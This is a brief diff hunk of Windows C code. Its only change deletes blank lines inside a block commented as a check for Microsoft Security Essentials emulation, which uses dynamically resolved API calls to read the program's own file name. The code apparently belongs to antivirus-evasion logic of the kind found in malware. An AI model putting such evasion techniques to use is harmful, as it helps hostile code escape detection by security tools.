@@ -383,9 +383,6 @@ NEXT_ENTRY:
 
 	/* Check for Microsoft Security Essential emulation */
 
-
-	
-
 	char *fName = (char *)pfn_VirtualAlloc(NULL, MAX_PATH, MEM_COMMIT, PAGE_READWRITE);
 	pfn_GetModuleFileNameA(NULL, fName, MAX_PATH);
 	DWORD prgLen = _STRLEN_(fName);
